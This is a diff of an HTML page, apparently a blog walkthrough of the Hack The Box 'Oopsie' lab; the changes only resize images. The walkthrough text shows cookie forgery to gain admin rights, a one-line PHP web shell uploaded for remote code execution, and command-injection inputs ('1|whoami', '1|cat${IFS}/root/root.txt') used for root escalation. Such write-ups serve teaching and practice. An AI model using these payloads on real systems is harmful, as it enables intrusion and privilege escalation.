@@ -34,9 +34,9 @@
       <p>I started by visiting the apache webpage and found the home page had no functionality. Next I used <code>gobuster</code> to check for any hidden directories. Gobuster revealed the <code>/cdn-cgi</code>
       path, but gave a 403 error upon visiting it. Using gobuster again, I checked further into cdn-cgi to find a <code>/login</code> endpoint.</p>
     <pre><code>$ gobuster dir -u http://10.129.204.23 -w Wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt</code></pre>
-    <img src="/images/htb/very-easy/oopsie/oopsie_gobuster_1.png" alt="Oopsie gobuster scan 1">
+    <img src="/images/htb/very-easy/oopsie/oopsie_gobuster_1.png" alt="Oopsie gobuster scan 1" style="width: 85%; height: auto;">
     <pre><code>$ gobuster dir -u http://10.129.204.23/cdn-cgi -w Wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt</code></pre>
-    <img src="/images/htb/very-easy/oopsie/oopsie_gobuster_1.png" alt="Oopsie gobuster scan 2">
+    <img src="/images/htb/very-easy/oopsie/oopsie_gobuster_1.png" alt="Oopsie gobuster scan 2" style="width: 85%; height: auto;">
       <p>The page seemed normal except for the option to log in as a guest user.</p>
     <pre><code>http://10.129.204.23/cdn-cgi/login</code></pre>
     <img src="/images/htb/very-easy/oopsie/oopsie_megacorp_login.png" alt="Oopsie megacorp login">
@@ -46,16 +46,16 @@
       <p>As a guest, the two pages that stuck out for me were account and uploads. I visited the account page and noticed a GET request using an <code>id</code> parameter.
       Changing this parameter displays the name, email, and access ID for a specific user. I changed the ID equal to 1 and found the admin's information.</p>
       <pre><code>http://10.129.204.23/cdn-cgi/login/admin.php?content=accounts&id=1</code></pre>
-    <img src="/images/htb/very-easy/oopsie/oopsie_account_admin.png" alt="Oopsie admin info">
+    <img src="/images/htb/very-easy/oopsie/oopsie_account_admin.png" alt="Oopsie admin info" style="width: 90%; height: auto;">
       <p>Prior to this finding, the uploads page required admin rights. When I used Burp Suite to analyze the request, I noticed two cookie values that defined me as a guest user.</p>
     <img src="/images/htb/very-easy/oopsie/oopsie_cookie.png" alt="Oopsie cookie values">
       <p>I changed both cookie values to match the admin user and was able to view the upload page fully.</p>
       <pre><code>Cookie: user=34322; role=admin</code></pre>
-    <img src="/images/htb/very-easy/oopsie/oopsie_upload_options.png" alt="Oopsie upload page">
+    <img src="/images/htb/very-easy/oopsie/oopsie_upload_options.png" alt="Oopsie upload page" style="width: 90%; height: auto;">
       <p>With the ability to upload files, I uploaded a webshell and found it in the <code>/uploads</code> directory discovered earlier with Gobuster.
         This gave me RCE on the host machine and I found the user flag in robert's directory.</p>
       <pre><code>&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;</code></pre>    
-    <img src="/images/htb/very-easy/oopsie/oopsie_upload_success.png" alt="Oopsie upload success">
+    <img src="/images/htb/very-easy/oopsie/oopsie_upload_success.png" alt="Oopsie upload success" style="width: 80%; height: auto;">
       <pre><code>http://10.129.204.23/uploads/shell.php?cat /home/robert/user.txt</code></pre>
     <img src="/images/htb/very-easy/oopsie/oopsie_user_flag.png" alt="Oopsie user flag">  
 
@@ -68,18 +68,18 @@
       During this time I kept losing my shell connection to the machine, so with my new credentials I logged in through SSH on port 22.</p>
       <img src="/images/htb/very-easy/oopsie/oopsie_robert_login.png" alt="Oopsie robert login">
       <br>
-      <img src="/images/htb/very-easy/oopsie/oopsie_robert_ssh.png" alt="Oopsie robert ssh">
+      <img src="/images/htb/very-easy/oopsie/oopsie_robert_ssh.png" alt="Oopsie robert ssh" style="width: 95%; height: auto;">
       <p>First I tried <code>sudo -l</code> to view what commands I could run with root privileges, but Robert could not run sudo at all. When I used <code>id</code>, I found that Robert was a part of the <code>bugtracker</code> group.</p>
       <img src="/images/htb/very-easy/oopsie/oopsie_robert_perms.png" alt="Oopsie robert perms">
       <p>To view all the files related to the bugtracker group I ran <code>find / -group bugtracker 2>/dev/null</code>. This revealed one file located in the <code>/usr/bin</code> directory which had root privileges.</p>  
       <pre><code>$ ls -la /usr/bin/bugtracker</code></pre>
       <img src="/images/htb/very-easy/oopsie/oopsie_bugtracker_perms.png" alt="Oopsie bugtracker perms">
       <p>Despite being an executable, I tried to view its contents and discovered it was running the command <code>cat /root/reports</code>.</p>
-      <img src="/images/htb/very-easy/oopsie/oopsie_bugtracker_file.png" alt="Oopsie bugtracker file">
+      <img src="/images/htb/very-easy/oopsie/oopsie_bugtracker_file.png" alt="Oopsie bugtracker file" style="width: 75%; height: auto;">
       <p>I ran <code>./bugtracker</code> as intended and it provided a normal bug report. The program seems to directly run the shell command <code>cat</code>, so I added a pipe followed by <code>whoami</code>
         to inject more commands. This was successful and displayed <code>root</code> as the output.</p>
       <pre><code>Provide Bug ID: 1|whoami</code></pre>
-      <img src="/images/htb/very-easy/oopsie/oopsie_bugtracker_injection.png" alt="Oopsie bugtracker injection">
+      <img src="/images/htb/very-easy/oopsie/oopsie_bugtracker_injection.png" alt="Oopsie bugtracker injection" style="width: 85%; height: auto;">
       <p>With command injection, I viewed the root directory and found the final flag. The input field had a hard time with spaces, so I used <code>${IFS}</code>, a bash shell variable that acts as a space.</p>
       <pre><code>Provide Bug ID: 1|cat${IFS}/root/root.txt</code></pre>
       <img src="/images/htb/very-easy/oopsie/oopsie_root_flag.png" alt="Oopsie root flag">  
